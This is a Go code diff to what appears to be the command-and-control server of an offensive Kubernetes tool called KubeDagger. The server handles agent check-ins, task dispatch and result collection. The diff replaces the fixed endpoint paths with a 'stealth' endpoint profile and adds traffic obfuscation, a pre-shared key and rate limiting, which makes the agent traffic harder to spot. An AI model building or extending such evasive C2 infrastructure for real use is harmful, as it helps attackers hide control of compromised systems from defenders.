@@ -9,19 +9,26 @@ import (
 	"time"
 
 	"github.com/sirupsen/logrus"
+	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
 )
 
 type ServerConfig struct {
-	ListenAddr string
-	TLSConfig  *tls.Config
+	ListenAddr  string
+	TLSConfig   *tls.Config
+	Endpoints   stealth.EndpointProfile
+	PSK         string
+	RateLimit   float64
+	RateBurst   int
+	ObfuscKey   string
 }
 
 type Server struct {
-	config   ServerConfig
-	httpSrv  *http.Server
-	agents   *AgentRegistry
-	tasks    *TaskQueue
-	handlers *Handlers
+	config      ServerConfig
+	httpSrv     *http.Server
+	agents      *AgentRegistry
+	tasks       *TaskQueue
+	handlers    *Handlers
+	rateLimiter *RateLimiter
 }
 
 func NewServer(cfg ServerConfig) *Server {
@@ -29,14 +36,40 @@ func NewServer(cfg ServerConfig) *Server {
 	tasks := NewTaskQueue()
 	handlers := NewHandlers(agents, tasks)
 
+	endpoints := cfg.Endpoints
+	if endpoints.Checkin == "" {
+		endpoints = stealth.GetProfile("legacy")
+	}
+
 	mux := http.NewServeMux()
-	mux.HandleFunc("/checkin", handlers.HandleCheckin)
-	mux.HandleFunc("/task", handlers.HandleTask)
-	mux.HandleFunc("/result", handlers.HandleResult)
+	mux.HandleFunc(endpoints.Checkin, handlers.HandleCheckin)
+	mux.HandleFunc(endpoints.Task, handlers.HandleTask)
+	mux.HandleFunc(endpoints.Result, handlers.HandleResult)
+
+	var handler http.Handler = mux
+
+	var rl *RateLimiter
+	if cfg.RateLimit > 0 {
+		burst := cfg.RateBurst
+		if burst == 0 {
+			burst = int(cfg.RateLimit) * 2
+		}
+		rl = NewRateLimiter(cfg.RateLimit, burst)
+		handler = rl.Middleware(handler)
+	}
+
+	if cfg.ObfuscKey != "" {
+		om := NewObfuscationMiddleware(cfg.ObfuscKey)
+		handler = om.Middleware(handler)
+	}
+
+	if cfg.PSK != "" {
+		handler = AuthMiddleware(cfg.PSK, handler)
+	}
 
 	srv := &http.Server{
 		Addr:         cfg.ListenAddr,
-		Handler:      mux,
+		Handler:      handler,
 		TLSConfig:    cfg.TLSConfig,
 		ReadTimeout:  30 * time.Second,
 		WriteTimeout: 30 * time.Second,
@@ -44,11 +77,12 @@ func NewServer(cfg ServerConfig) *Server {
 	}
 
 	return &Server{
-		config:   cfg,
-		httpSrv:  srv,
-		agents:   agents,
-		tasks:    tasks,
-		handlers: handlers,
+		config:      cfg,
+		httpSrv:     srv,
+		agents:      agents,
+		tasks:       tasks,
+		handlers:    handlers,
+		rateLimiter: rl,
 	}
 }
 
@@ -86,5 +120,8 @@ func (s *Server) Start() error {
 
 func (s *Server) Stop(ctx context.Context) error {
 	s.agents.Stop()
+	if s.rateLimiter != nil {
+		s.rateLimiter.Stop()
+	}
 	return s.httpSrv.Shutdown(ctx)
 }
